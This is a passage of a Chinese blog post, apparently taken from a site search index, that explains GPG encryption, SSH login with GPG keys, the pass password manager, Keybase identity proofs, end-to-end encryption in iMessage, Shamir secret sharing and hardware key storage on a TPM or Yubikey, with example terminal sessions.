xkP+CtF+S8xWTciaexIMQiTHLNu1tvhvCjIeR1qYJY0/E7tdKhS5iG4Jc3/oyCNN a1m34O9GG5WJsHozGqpfKZFma50onDmQ6TnSuz4iDWrslvq3XuLRXvgOQ6DKArix Sxnmxg1kMvlIF6AMmQRHaHpyXBoOlaX/NEsl8ESCe9w4KZFTCoFtsEB9tAwQGeGn 6Tnd7BLaxXOabqaSpoNcOlpWDlZcX89lbewAryKbY9I7AbURsuemI37bTizQUjWA 57xm4t7wTUJ/FLx22Amv1ljUa/Rq84rO8d38EQViNGyo31UmRVXy12AmBDU= =T42S -----END PGP MESSAGE----- \u8fd9\u91cc\u6211\u4eec\u6307\u5b9a\u4e86\u6211\u81ea\u5df1\u7684\u516c\u94a5\u4e3a\u6536\u4fe1\u4eba\uff0c\u53ef\u4ee5\u770b\u5230\u4e0d\u540c\u4e8e\u524d\u9762\uff0c\u52a0\u5bc6\u6d88\u606f\u6ca1\u6709\u660e\u6587\u90e8\u5206\uff0c\u9664\u975e\u4f7f\u7528\u6536\u4fe1\u4eba\u7684\u79c1\u94a5\uff0c\u5426\u5219\u65e0\u6cd5\u89e3\u5bc6\uff1a $ gpg -d < gpg-message gpg 2048-bit RSA key, ID 289286B3, created 2016-06-28 (main key ID E466CF1E) Wang Ziting <jysperm@gmail.com> hello SSH \u56e0\u4e3a SSH \u548c GPG \u90fd\u652f\u6301\u4e00\u6837\u7684\u516c\u94a5\u52a0\u5bc6\u7b97\u6cd5\uff08\u4f8b\u5982 RSA\uff09\uff0c\u56e0\u6b64\u4f60\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5728 SSH \u4e0a\u4f7f\u7528 GPG \u7684\u5bc6\u94a5\u3002 \u4f8b\u5982\u5c06\u4f60\u7684 GPG \u516c\u94a5\u6dfb\u52a0\u5230 GitHub\uff0c\u7136\u540e\u4f7f\u7528\u5b83\u6765\u767b\u5f55 GitHub: ~> export SSH_AUTH_SOCK=~/.gnupg/S.gpg-agent.ssh ~> ssh-add -l 2048 SHA256:wO93TcTQHZtltKfvS0jewFh0CMj4No6xnTegtB8FN+k ~> ssh git@github.com Hi jysperm! You've successfully authenticated, but GitHub does not provide shell access. Connection to github.com closed. \u7ba1\u7406\u5bc6\u7801 \u6709\u4e00\u4e2a\u6bd4\u8f83\u6709\u8da3\u7684\u5b9e\u8df5\u662f\u4f60\u53ef\u4ee5\u7528 gpg \u6765\u52a0\u5bc6\u4f60\u7684\u5bc6\u7801\uff0c pass-store \u662f\u4e00\u4e2a\u57fa\u4e8e GPG \u548c Git \u7684\u975e\u5e38\u7b80\u5355\u7684\u5bc6\u7801\u7ba1\u7406\u5668\uff0c\u5b83\u53ef\u4ee5\u7528 GPG \u6765\u52a0\u5bc6\u5bc6\u7801\uff0c\u7136\u540e\u7528 Git \u6765\u8fdb\u884c\u7248\u672c\u63a7\u5236\uff1a ~> pass find Coding Search Terms: Coding \u2514\u2500\u2500 Code \u2514\u2500\u2500 Coding \u2514\u2500\u2500 jysperm.gpg ~> pass insert Code/Coding/jysperm ~> pass show Code/Coding/jysperm DzizKKVIy22aHQwm ~> pass git pull --rebase remote: Counting objects: 11, done. remote: Total 11 (delta 1), reused 1 (delta 1), pack-reused 10 Unpacking objects: 100% (11/11), done. From github.com:jysperm/passwords 5026f34..e94a70f master -> origin/master First, rewinding head to replay your work on top of it... Fast-forwarded master to e94a70f8b42af5e1c13dd69246b156bbcb24a94c. \u8fd9\u6837\u4e00\u6765\u4f60\u751a\u81f3\u53ef\u4ee5\u628a\u5bc6\u7801\u6258\u7ba1\u5728 GitHub \u4e0a\uff1a https://github.com/jysperm/passwords KeyBase \u548c\u8eab\u4efd\u8bc1\u660e \u518d\u5411\u5927\u5bb6\u4ecb\u7ecd\u4e00\u4e2a\u6709\u8da3\u7684\u793e\u533a \u2014\u2014 Keybase \uff0c\u5b83\u5c31\u597d\u50cf\u662f GitHub \u4e4b\u4e8e GPG \u793e\u533a\u4e00\u6837\u3002\u63d0\u4f9b\u4e86\u4e00\u4e2a\u4f60\u7684 GPG \u8eab\u4efd\u7684\u4e3b\u9875\uff0c\u4e0a\u9762\u6709\u4f60\u7684\u516c\u94a5\u3001\u5173\u8054\u7684 GitHub \u5e10\u53f7\u3001Twitter \u5e10\u53f7\u4ee5\u53ca\u6240\u62e5\u6709\u7684\u7f51\u7ad9\uff0c\u4ed6\u4eba\u8fd8\u53ef\u4ee5\u5728\u8fd9\u4e2a\u7f51\u9875\u4e0a\u76f4\u63a5\u7528\u4f60\u7684\u516c\u94a5\u53d1\u9001\u7ecf\u8fc7 GPG \u52a0\u5bc6\u7684\u4fe1\u606f\u3002\u4f60\u53ef\u4ee5\u5c06\u4f60\u7684\u79c1\u94a5\u4ee5\u52a0\u5bc6\u7684\u65b9\u5f0f\u5b58\u50a8\u5728 Keybase\uff08\u5f53\u7136\u4e0d\u63a8\u8350\u8fd9\u6837\u505a\uff09\uff0cKeybase \u63d0\u4f9b\u4e86\u5728\u6d4f\u89c8\u5668\u4e2d\u4f7f\u7528\u5bc6\u94a5\u5bf9\u8fdb\u884c\u52a0\u5bc6\u3001\u89e3\u5bc6\u3001\u7b7e\u540d\u3001\u9a8c\u7b7e\u7684\u529f\u80fd\u3002 \u524d\u9762\u6211\u4eec\u63d0\u5230\u5728 Keybase \u4e0a\u4f60\u53ef\u4ee5\u5173\u8054\u4f60\u7684\u793e\u4ea4\u5e10\u53f7\uff0c\u4e0d\u540c\u4e8e\u4e00\u822c\u7684\u7f51\u7ad9\u7684\u300c\u7b2c\u4e09\u65b9\u5e10\u53f7\u5173\u8054\u300d\uff0cKeybase \u7684\u7528\u6237\u4eec\u663e\u7136\u90fd\u5bf9\u53bb\u4e2d\u5fc3\u5316\u975e\u5e38\u5728\u4e4e\uff0c\u90a3\u4e48\u5982\u4f55\u53bb\u8bc1\u660e\u4e00\u4e2a\u793e\u4ea4\u5e10\u53f7\u662f\u5c5e\u4e8e\u8fd9\u4e2a GPG \u516c\u94a5\u7684\u5462\uff1f\u5728\u8fd9\u4e2a\u573a\u666f\u4e2d\u6211\u4eec\u9700\u8981\u8fdb\u884c\u4e24\u65b9\u9762\u7684\u8bc1\u660e\uff0c\u4e00\u65b9\u9762\u662f\u8981\u7528 GPG \u516c\u94a5\u53bb\u8fdb\u884c\u4e00\u4e2a\u7b7e\u540d\uff0c\u58f0\u660e\u4ed6\u62e5\u6709\u8fd9\u4e2a\u793e\u4ea4\u5e10\u53f7\uff1a \u53e6\u4e00\u65b9\u9762\u662f\u7528\u8fd9\u4e2a\u793e\u4ea4\u5e10\u53f7\u5c06\u8fd9\u4e2a\u7b7e\u540d\u53d1\u5e03\u51fa\u6765\uff0c\u6765\u58f0\u660e\u4ed6\u62e5\u6709\u8fd9\u4e2a GPG \u516c\u94a5\uff1a \u8fd9\u79cd\u4ea4\u53c9\u7684\u8bc1\u660e\u5c06\u4e0d\u540c\u7684\u6570\u5b57\u8eab\u4efd\u8054\u7cfb\u5230\u4e86\u4e00\u8d77\uff0c\u6211\u89c9\u5f97\u8fd9\u662f\u4e00\u4e2a\u633a\u6709\u8da3\u7684\u4e8b\u60c5\uff0c\u4e8e\u662f\u6211\u5728 KeyBase \u4e4b\u5916\u4e5f\u81ea\u5df1\u521b\u5efa\u4e86\u4e00\u4e2a GPG \u4e3b\u9875\uff0c\u5e76\u5728\u4e0a\u9762\u5217\u51fa\u4e86\u4e00\u4e9b\u548c\u5176\u4ed6\u6570\u5b57\u8eab\u4efd\u7684\u4ea4\u53c9\u8bc1\u660e\uff0c\u4f8b\u5982\u90ae\u4ef6\u3001V2EX \u5e10\u53f7\u7b49\u3002\u6211\u8fd8\u6ce8\u518c\u4e86\u4e00\u4e2a\u6211\u7684 GPG \u516c\u94a5\u540e\u516b\u4f4d\u7684\u57df\u540d\u6765\u6307\u5411\u8fd9\u4e2a\u9875\u9762\uff1a http://E466CF1E.pub \u7aef\u5230\u7aef\u52a0\u5bc6 \u6211\u4eec\u518d\u6765\u8f6c\u5411\u8fd9\u7bc7\u6587\u7ae0\u7684\u7b2c\u4e8c\u4e2a\u8bdd\u9898\u300c\u7aef\u5230\u7aef\u52a0\u5bc6\u300d\uff0c\u4e0b\u56fe\u4e2d\u5206\u522b\u5c55\u793a\u4e86\u5728\u65e0\u52a0\u5bc6\u3001SSL \u52a0\u5bc6\u548c\u7aef\u5230\u7aef\u52a0\u5bc6\u7684\u573a\u666f\u4e0b\uff0c\u4ece A \u5230 B\u3001\u4e2d\u95f4\u7ecf\u8fc7\u670d\u52a1\u5668\u7684\u4e00\u6b21\u901a\u8baf\u7684\u8fc7\u7a0b\uff1a \u5728\u6ca1\u6709\u52a0\u5bc6\u7684\u60c5\u51b5\u4e0b\uff0c\u6d88\u606f\u4ece A \u5230\u670d\u52a1\u5668\u3001\u518d\u5230 B \u7684\u5168\u7a0b\u90fd\u6ca1\u6709\u52a0\u5bc6\u3002\u8fd9\u4e5f\u610f\u5473\u7740\u6570\u636e\u7ecf\u8fc7\u7684\u94fe\u8def\u4e0a\u7684\u4efb\u4f55\u4e00\u4e2a\u8282\u70b9\uff08\u4f8b\u5982\u8fd0\u8425\u5546\u7684\u8def\u7531\u5668\uff09\u90fd\u53ef\u4ee5\u67e5\u770b\u548c\u4fee\u6539\u6d88\u606f\u7684\u5185\u5bb9\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u7684\u901a\u8baf\u5b89\u5168\u662f\u5b8c\u5168\u6ca1\u6709\u4fdd\u8bc1\u7684\u3002 \u5728\u7ecf\u8fc7 SSL \u52a0\u5bc6\u7684\u60c5\u51b5\u4e0b\uff0cA \u548c B \u4f1a\u5206\u522b\u5728\u6536\u53d1\u6d88\u606f\u524d\u901a\u8fc7 CA \u7b7e\u7f72\u7684\u8bc1\u4e66\u53bb\u8ba4\u8bc1\u670d\u52a1\u5668\u7684\u8eab\u4efd\uff0c\u5e76\u534f\u5546\u4e00\u4e2a\u7528\u4e8e\u52a0\u5bc6\u6570\u636e\u7684\u5bc6\u94a5\u3002\u5728\u4ece A \u5230\u670d\u52a1\u5668\uff0c\u6216\u4ece\u670d\u52a1\u5668\u5230 B \u7684\u8fc7\u7a0b\u4e2d\uff0cSSL \u4f1a\u4fdd\u8bc1\u6570\u636e\u4e0d\u88ab\u7a83\u542c\u548c\u7be1\u6539\uff0c\u4f46\u6d88\u606f\u5728\u670d\u52a1\u5668\u4e0a\u5219\u662f\u4ee5\u672a\u52a0\u5bc6\u7684\u5f62\u6001\u5b58\u5728\u7684\uff0c\u670d\u52a1\u5668\u53ef\u4ee5\u67e5\u770b\u548c\u4fee\u6539\u6d88\u606f\u7684\u5185\u5bb9\uff0c\u8fdb\u884c\u4e00\u4e9b\u5185\u5bb9\u4e0a\u7684\u5ba1\u67e5\u3002 \u5728\u7aef\u5230\u7aef\u52a0\u5bc6\u7684\u60c5\u51b5\u4e0b\uff0c\u6d88\u606f\u5728\u4ece A \u53d1\u51fa\u4e4b\u524d\uff0c\u5c31\u4f1a\u5229\u7528\u6211\u4eec\u524d\u9762\u4ecb\u7ecd\u8fc7\u7684\u516c\u94a5\u52a0\u5bc6\u6280\u672f\uff0c\u4f7f\u7528 B \u7684\u516c\u94a5\u8fdb\u884c\u52a0\u5bc6\uff0c\u4e2d\u95f4\u4ee5\u52a0\u5bc6\u7684\u5f62\u5f0f\u7ecf\u8fc7\u670d\u52a1\u5668\u548c\u5176\u4ed6\u8def\u7531\u8282\u70b9\uff0c\u76f4\u5230 B \u6536\u5230\u6d88\u606f\u540e\uff0c\u624d\u4f7f\u7528\u81ea\u5df1\u7684\u79c1\u94a5\u8fdb\u884c\u89e3\u5bc6\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\u7684\u670d\u52a1\u5668\u5e76\u4e0d\u80fd\u67e5\u770b\u548c\u4fee\u6539\u6d88\u606f\uff0c\u4ec5\u4ec5\u4f5c\u4e3a\u4e00\u4e2a\u6e20\u9053\u6765\u8f6c\u53d1\u6d88\u606f\u3002 \u6211\u4eec\u5f53\u7136\u53ef\u4ee5\u7b80\u5355\u5730\u4f7f\u7528 GPG \u52a0\u5bc6\u6211\u4eec\u5728\u7b2c\u4e09\u65b9\u5373\u65f6\u901a\u8baf\u8f6f\u4ef6\u4e0a\u7684\u804a\u5929\u5185\u5bb9\uff0c\u5c31\u50cf\u4e0b\u9762\u8fd9\u6837\uff1a \u4f46\u5b9e\u9645\u4e0a\u4f8b\u5982 Tox\u3001Line\u3001WhatsApp\u3001iMessage \u7b49 IM \u8f6f\u4ef6\uff0c\u90fd\u662f\u9ed8\u8ba4\u63d0\u4f9b\u4e86\u7aef\u5230\u7aef\u52a0\u5bc6\u7684\u7279\u6027\u7684\uff0c\u6211\u4eec\u4e0b\u9762\u4ee5 iMessage \u4e3a\u4f8b\u53bb\u4ecb\u7ecd\u4e00\u4e2a IM \u8f6f\u4ef6\u662f\u5982\u4f55\u5b8c\u6210\u7aef\u5230\u7aef\u52a0\u5bc6\u901a\u8baf\u7684\u3002 iMessage \u4f1a\u5728\u6bcf\u53f0\u8bbe\u5907\u4e0a\u751f\u6210\u4e00\u4e2a RSA \u5bc6\u94a5\u5bf9\u7528\u4e8e\u5bf9\u6570\u636e\u8fdb\u884c\u52a0\u5bc6\uff0c\u4ee5\u53ca\u4e00\u4e2a ECDSA \u5bc6\u94a5\u5bf9\u7528\u4f5c\u7b7e\u540d\uff08\u5b83\u51fa\u4e8e\u5b89\u5168\u6027\u548c\u6027\u80fd\u7684\u8003\u8651\u4f7f\u7528\u4e86\u4e0d\u540c\u7684\u5bc6\u94a5\u5bf9\uff0c\u4f46\u5176\u5b9e\u662f\u53ef\u4ee5\u7528\u540c\u4e00\u4e2a\u5bc6\u94a5\u5bf9\u7684\uff09\u3002\u8fd9\u4e9b\u5bc6\u94a5\u5bf9\u4e2d\u7684\u516c\u94a5\u4f1a\u88ab\u4e0a\u4f20\u5230 Apple IDS\uff08Identity Services\uff09\uff0c\u7136\u540e\u5176\u4ed6\u7528\u6237\u4f1a\u4ece IDS \u4e2d\u53d6\u5f97\u4f60\u7684\u6240\u6709\u516c\u94a5\uff08\u6bcf\u4e2a\u8bbe\u5907\u4e00\u4e2a\u516c\u94a5\uff09\u3002\u5728 iMessage \u4e2d\u53d1\u51fa\u7684\u6240\u6709\u6587\u5b57\u6d88\u606f\u90fd\u4f1a\u4f7f\u7528\u81ea\u5df1\u7684 ECDSA \u79c1\u94a5\u8fdb\u884c\u7b7e\u540d\uff0c\u4f7f\u7528\u5bf9\u65b9\u7684\u6bcf\u4e2a\u8bbe\u5907\u7684 RSA \u516c\u94a5\u52a0\u5bc6\u4e00\u4efd\uff0c\u901a\u8fc7 APNs \u53d1\u9001\u7ed9\u5bf9\u65b9\u3002\u5bf9\u4e8e\u591a\u5a92\u4f53\u6d88\u606f\uff0c\u4e3a\u4e86\u51cf\u5c11\u52a0\u5bc6\u5e26\u6765\u7684\u5f00\u9500\uff0c\u4ee5\u53ca\u52a0\u5bc6\u591a\u4efd\u7684\u6d41\u91cf\u5f00\u9500\uff0c\u4f1a\u4f7f\u7528\u4e00\u4e2a\u4e34\u65f6\u5bc6\u94a5\u52a0\u5bc6\u4e00\u6b21\uff0c\u901a\u8fc7 iCloud \u8fdb\u884c\u4f20\u8f93\uff0c\u7136\u540e\u901a\u8fc7\u524d\u9762\u63d0\u5230\u7684\u65b9\u5f0f\u53d1\u9001\u4e34\u65f6\u5bc6\u94a5\u3002\u82f9\u679c\u7684\u5f88\u591a\u5e94\u7528\u90fd\u4f7f\u7528\u7c7b\u4f3c\u7684\u65b9\u5f0f\u8fdb\u884c\u7aef\u5230\u7aef\u52a0\u5bc6\uff0c\u5305\u62ec iCloud\u3001Facetime\u3001Keychain \u7b49\u3002 \u4f46\u5728\u8fd9\u4e2a\u67b6\u6784\u4e2d\uff0cApple IDS \u4f9d\u7136\u662f\u4e00\u4e2a\u4e2d\u5fc3\u5316\u7684\u5355\u70b9\uff0c\u5b83\u63a7\u5236\u4e86\u5168\u90e8\u7684\u516c\u94a5\u4ea4\u6362\u8fc7\u7a0b\uff0c\u800c\u4e14\u4e0d\u5141\u8bb8\u7528\u6237\u5e72\u9884\u3002\u8fd9\u5c31\u610f\u5473\u7740 Apple \u4f9d\u7136\u53ef\u4ee5\u5728 IDS \u4e0a\u8fdb\u884c\u4e2d\u95f4\u4eba\u653b\u51fb\uff0c\u8fd9\u4e5f\u5370\u8bc1\u4e86\u6211\u4eec\u5728\u4e00\u5f00\u59cb\u63d0\u5230\u7684\uff0c\u516c\u94a5\u7684\u4ea4\u6362\u662f\u4e00\u4e2a\u65e0\u6cd5\u7ed5\u5f00\u7684\u95ee\u9898\u3002\u5728 GPG \u4e2d\uff0c\u7528\u6237\u9700\u8981\u7e41\u7410\u5730\u5b8c\u5168\u624b\u52a8\u5730\u53bb\u5efa\u7acb\u4fe1\u4efb\u5173\u7cfb\uff0c\u6362\u53d6\u4e86\u6700\u9ad8\u7684\u53bb\u4e2d\u5fc3\u5316\u7a0b\u5ea6\uff1b\u800c\u5728 iMessage \u4e2d IDS \u4ee3\u52b3\u4e86\u516c\u94a5\u4ea4\u6362\u7684\u5de5\u4f5c\uff0c\u65b9\u4fbf\u4e86\u7528\u6237\uff0c\u4f46\u4e5f\u5f15\u5165\u4e86\u5b89\u5168\u98ce\u9669\u3002 \u540c\u65f6\u7fa4\u804a\u4e5f\u662f\u4e00\u4e2a\u6bd4\u8f83\u96be\u4ee5\u89e3\u51b3\u7684\u95ee\u9898\uff0c\u5728 Telegram \u4e2d\u7fa4\u804a\u662f\u65e0\u6cd5\u5f00\u542f\u7aef\u5230\u7aef\u52a0\u5bc6\u6a21\u5f0f\u7684\uff0c\u5728 iMessage \u4e2d\u7fa4\u804a\u4e5f\u4e0d\u603b\u662f\u53ef\u4ee5\u4f7f\u7528\u7aef\u5230\u7aef\u52a0\u5bc6\u3002\u8fd9\u662f\u56e0\u4e3a\u5c31\u50cf\u524d\u9762\u63d0\u5230\u7684\u591a\u8bbe\u5907\u7684\u60c5\u51b5\u4e00\u6837\uff0c\u5728\u7fa4\u804a\u7684\u60c5\u51b5\u4e0b\u6211\u4eec\u5fc5\u987b\u7528\u6bcf\u4e2a\u4eba\u7684\u516c\u94a5\u6765\u52a0\u5bc6\u6570\u636e\uff0c\u8fd9\u6837\u6570\u636e\u5728\u53d1\u9001\u7aef\u5c31\u4f1a\u81a8\u80c0\u8bb8\u591a\u500d\uff08\u800c\u4e0d\u80fd\u53d1\u9001\u7aef\u53ea\u53d1\u9001\u4e00\u4efd\uff0c\u7531\u670d\u52a1\u5668\u8f6c\u53d1\uff09\uff0c\u5177\u4f53\u7684\u5e26\u5bbd\u5f00\u9500\u4f1a\u53d6\u51b3\u4e8e\u7fa4\u804a\u4e2d\u7684\u4eba\u6570\uff1a \u4fdd\u7ba1\u5bc6\u94a5 \u524d\u9762\u6211\u4eec\u63d0\u5230\uff0c\u5728\u5bc6\u7801\u5b66\u8d26\u6237\u4e2d\uff0c\u4f60\u62e5\u6709\u4e00\u4e2a\u8d26\u6237\u7684\u552f\u4e00\u51ed\u8bc1\u5c31\u662f\u4f60\u7684\u5bc6\u94a5\u5bf9\uff0c\u4e00\u65e6\u9057\u5931\uff0c\u90a3\u4e48\u4f60\u4fbf\u6ca1\u6709\u529e\u6cd5\u518d\u53bb\u63a7\u5236\u8fd9\u4e2a\u8d26\u6237\uff1b\u6216\u8005\u4e00\u65e6\u6cc4\u6f0f\uff0c\u5176\u4ed6\u4eba\u4fbf\u62e5\u6709\u548c\u4f60\u4e00\u6837\u7684\u63a7\u5236\u8fd9\u4e2a\u8d26\u6237\u7684\u80fd\u529b\uff0c\u65e0\u6cd5\u91cd\u7f6e\uff0c\u56e0\u6b64\u5bf9\u5bc6\u94a5\u7684\u4fdd\u7ba1\u663e\u5f97\u5c24\u4e3a\u91cd\u8981\u3002 \u300c\u5907\u4efd\u300d\u662f\u5177\u6709\u4e24\u9762\u6027\u7684 \u2014\u2014 \u4e00\u65b9\u9762\u4f1a\u8ba9\u5bc6\u94a5\u66f4\u4e0d\u5bb9\u6613\u4e22\u5931\uff0c\u4f46\u4e5f\u8ba9\u5bc6\u94a5\u53d8\u5f97\u66f4\u52a0\u5bb9\u6613\u6cc4\u6f0f\u3002\u4e8e\u662f\u6211\u5c31\u6709\u4e2a\u6709\u8da3\u7684\u60f3\u6cd5\uff1a\u80fd\u5426\u505a\u5230\u5c06\u4e00\u4e2a\u5bc6\u94a5\u5206\u4e3a\u82e5\u5e72\u300c\u7247\u6bb5\u300d\u4fdd\u5b58\uff0c\u4ec5\u5f53\u62e5\u6709\u5176\u4e2d\u5927\u90e8\u5206\u7247\u6bb5\u7684\u7684\u65f6\u5019\u624d\u80fd\u591f\u8fd8\u539f\u51fa\u5bc6\u94a5\uff0c\u4f46\u4e22\u5931\u4e86\u5c0f\u90e8\u5206\u7247\u6bb5\u53c8\u4e0d\u5f71\u54cd\u8fd8\u539f\u5462\uff1f\u6bd4\u5982\u5c06\u5bc6\u94a5\u5206\u4e3a 5 \u4efd\uff0c\u4ec5\u5f53\u62e5\u6709\u5176\u4e2d\u4efb\u610f\u4e09\u4efd\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u8fd8\u539f\u51fa\u5bc6\u94a5\u3002\u4e8e\u662f\u6211\u627e\u5230\u4e86\u4e00\u4e2a\u53eb\u300cShamir\u2019s Secret Sharing\u300d\u7684\u7b97\u6cd5\u6765\u505a\u5230\u8fd9\u4e00\u70b9\uff1a ~> ssss-split -t 3 -n 5 Generating shares using a (3,5) scheme with dynamic security level. Enter the secret, at most 128 ASCII characters: my secret root password Using a 184 bit security level. 1-1c41ef496eccfbeba439714085df8437236298da8dd824 2-fbc74a03a50e14ab406c225afb5f45c40ae11976d2b665 3-fa1c3a9c6df8af0779c36de6c33f6e36e989d0e0b91309 4-468de7d6eb36674c9cf008c8e8fc8c566537ad6301eb9e 5-4756974923c0dce0a55f4774d09ca7a4865f64f56a4ee0 ~> ssss-combine -t 3 Enter 3 shares separated by newlines: Share [1/3]: 3-fa1c3a9c6df8af0779c36de6c33f6e36e989d0e0b91309 Share [2/3]: 5-4756974923c0dce0a55f4774d09ca7a4865f64f56a4ee0 Share [3/3]: 2-fbc74a03a50e14ab406c225afb5f45c40ae11976d2b665 Resulting secret: my secret root password \u4f46\u5c06\u5bc6\u94a5\u4f5c\u4e3a\u4e00\u4e2a\u6587\u4ef6\uff0c\u5c24\u5176\u662f\u672a\u52a0\u5bc6\u7684\u6587\u4ef6\u5b58\u50a8\u5728\u7535\u8111\u4e0a\u4ecd\u7136\u8fd8\u662f\u76f8\u5f53\u4e0d\u5b89\u5168\u7684\uff0c\u56e0\u4e3a\u4f60\u7684\u7535\u8111\u4e0a\u5b89\u88c5\u4e86\u592a\u591a\u4e71\u4e03\u516b\u7cdf\u7684\u8f6f\u4ef6\u4e86\uff0c\u76ee\u524d\u5927\u591a\u6570\u684c\u9762\u64cd\u4f5c\u7cfb\u7edf\u5176\u5b9e\u90fd\u6ca1\u6709\u5f88\u597d\u7684\u6743\u9650\u63a7\u5236 \u2014\u2014 \u51e0\u4e4e\u6240\u6709\u8f6f\u4ef6\u90fd\u53ef\u4ee5\u968f\u610f\u5730\u8bfb\u53d6\u4f60\u6240\u6709\u7684\u6587\u4ef6\u3002\u56e0\u6b64 \u5b58\u50a8\u5728\u786c\u76d8\u4e0a\u7684\u6587\u4ef6\u662f\u65e9\u665a\u8981\u6cc4\u6f0f\u7684 \uff0c\u6211\u4eec\u5e94\u8be5\u628a\u5bc6\u94a5\u5b58\u50a8\u5230\u4e00\u4e2a\u65e0\u6cd5\u88ab\u8bfb\u53d6\u7684\u5730\u65b9\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u4e0b\u9762\u8981\u4ecb\u7ecd\u7684 TPM \u82af\u7247\u3002 \u4f5c\u4e3a\u4e00\u4e2a\u82af\u7247\u6765\u8bb2\uff0c\u5916\u754c\u5fc5\u987b\u901a\u8fc7\u5df2\u7ecf\u88ab\u786c\u4ef6\u5b9a\u4e49\u597d\u7684\u534f\u8bae\u53bb\u64cd\u4f5c\u5b83\uff0c\u800c\u5bf9\u4e8e TPM \u6765\u8bb2\uff0c\u5b83\u5728\u786c\u4ef6\u7684\u8bbe\u8ba1\u4e0a\u5c31\u4e0d\u5141\u8bb8\u4f60\u4ece\u82af\u7247\u4e2d\u53d6\u51fa\u79c1\u94a5\uff0c\u4f60\u53ea\u80fd\u5c06\u79c1\u94a5\u5b58\u8fdb\u53bb\uff0c\u6216\u8005\u5728 TPM \u4e0a\u751f\u6210\u5bc6\u94a5\u5bf9\u3002\u4e4b\u540e\u548c\u79c1\u94a5\u6709\u5173\u7684\u6240\u6709\u8fd0\u7b97\uff0c\u5305\u62ec\u89e3\u5bc6\u548c\u7b7e\u540d\u90fd\u662f\u5728 TPM \u82af\u7247\u4e0a\u8fdb\u884c\u7684\uff0c\u6574\u4e2a\u8fc7\u7a0b\u4e2d\u5bc6\u94a5\u90fd\u4e0d\u4f1a\u79bb\u5f00 TPM \u82af\u7247\uff0c\u5373\u4f7f\u4f5c\u4e3a\u786c\u4ef6\u7684 TPM \u82af\u7247\u88ab\u76d7\uff0c\u4ed6\u4eba\u4e5f\u65e0\u6cd5\u590d\u5236\u82af\u7247\u4e2d\u7684\u79c1\u94a5\u3002 TPM \u5176\u5b9e\u5b58\u5728\u4e0e\u5f88\u591a\u7b14\u8bb0\u672c\u548c\u624b\u673a\u4e2d\uff0ciPhone \u7684\u5b58\u50a8\u82af\u7247\u548c\u6307\u7eb9\u8bc6\u522b\u90fd\u662f\u4f9d\u8d56\u4e8e TPM \u5de5\u4f5c\u7684\u3002\u6211\u76ee\u524d\u5728\u4f7f\u7528\u662f\u7684\u4e00\u6b3e\u53eb Yubikey \u7684 USB TPM \u82af\u7247\uff0c\u5b83\u652f\u6301 GPG SmartCard \u7684\u6807\u51c6\uff0c\u53ef\u4ee5\u5c06 GPG \u7684\u5bc6\u94a5\u5b58\u50a8\u5728\u5176\u4e2d\u3002 \u5c0f\u7ed3 GPG \u53ef\u4ee5\u5728\u4e92\u8054\u7f51\u4e0a\uff0c\u4ee5\u6570\u5b66\u4e3a\u57fa\u7840\u521b\u9020\u4e00\u4e2a\u65e0\u6cd5\u88ab\u4f2a\u9020\u7684\u8eab\u4efd\uff0c\u5e76\u4ee5\u6b64\u8eab\u4efd\u7b7e\u540d\u4fe1\u606f\u3001\u63a5\u6536\u52a0\u5bc6\u4fe1\u606f\u3002 GPG \u4f7f\u7528\u53bb\u4e2d\u5fc3\u5316\u7684\u4fe1\u4efb\u6a21\u578b\uff0c\u9700\u8981\u81ea\u884c\u901a\u8fc7\u591a\u79cd\u6e20\u9053\u6765\u4ea4\u6362\u516c\u94a5\uff0c\u56e0\u6b64\u4e0d\u4f1a\u53d7\u5236\u4e8e\u5355\u4e00\u7684\u6743\u5a01\u673a\u6784\u3002 GPG \u63d0\u4f9b\u4e86\u8eab\u4efd\u7ba1\u7406\u548c\u76f8\u4e92\u8fdb\u884c\u300c\u4fe1\u4efb\u7b7e\u540d\u300d\u7684\u673a\u5236\u6765\u7b80\u5316\u5bc6\u94a5\u7684\u4ea4\u6362\u8fc7\u7a0b\u3002 GPG \u662f\u4e00\u4e2a\u5f00\u653e\u7684\u6807\u51c6\uff08\u517c\u5bb9\u5f88\u591a\u8f6f\u4ef6\u548c\u786c\u4ef6\uff09\uff0c\u6709\u7740\u6d3b\u8dc3\u7684\u793e\u533a\uff0c\u63d0\u4f9b\u4e86\u76f8\u5bf9\u6613\u7528\u7684\u5de5\u5177\u6765\u8fdb\u884c\u516c\u94a5\u52a0\u5bc6\u3001\u89e3\u5bc6\u3001\u7b7e\u540d\u3001\u9a8c\u7b7e\u3002 \u57fa\u4e8e\u516c\u94a5\u52a0\u5bc6\u5e76\u7b7e\u540d\u7684\u7aef\u5230\u7aef\u52a0\u5bc6\u662f\u4ece\u7406\u8bba\u4e0a\u4fdd\u8bc1\u901a\u8baf\u5b89\u5168\u7684\u552f\u4e00\u65b9\u6cd5\uff0c\u4f46\u5728\u6b64\u4e4b\u524d\u4f60\u9700\u8981\u901a\u8fc7\u67d0\u79cd\u65b9\u5f0f\u6765\u4ea4\u6362\u516c\u94a5\u3002 \u5982\u679c\u79c1\u94a5\u4e22\u5931\u5c31\u53ea\u80fd\u6539\u5934\u6362\u9762\u3001\u91cd\u65b0\u505a\u4eba\u4e86\u3002 \u53c2\u8003\u6765\u6e90 The beauty of asymmetric encryption - RSA crash course for developers Wikipedia: Comparison of instant messaging clients#Secure messengers The Keysigning Party HOWTO \uff08 \u7e41\u4f53\u4e2d\u6587 \uff09 iOS Security Guide Wikipedia: Shamir\u2019s Secret Sharing \u4e00\u4e2a\u5f00\u6e90\u5b9e\u73b0\uff1assss \u539f\u6587\u94fe\u63a5\uff1a https://jysperm.me/2017/09/gpg-and-e2ee/","title":"\u738b\u5b50\u4ead\u7684\u535a\u5ba2 GPG \u4e0e\u7aef\u5230\u7aef\u52a0\u5bc6\uff1a\u8bba\u4ec0\u4e48\u624d\u662f\u53ef\u4ee5\u4fe1\u4efb\u7684"},{"location":"other/%E7%8E%8B%E5%AD%90%E4%BA%AD%E7%9A%84%E5%8D%9A%E5%AE%A2%20GPG%20%E4%B8%8E%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%8A%A0%E5%AF%86%EF%BC%9A%E8%AE%BA%E4%BB%80%E4%B9%88%E6%89%8D%E6%98%AF%E5%8F%AF%E4%BB%A5%E4%BF%A1%E4%BB%BB%E7%9A%84/#gpg","text":"2017 9 \u6708 12 \u65e5* 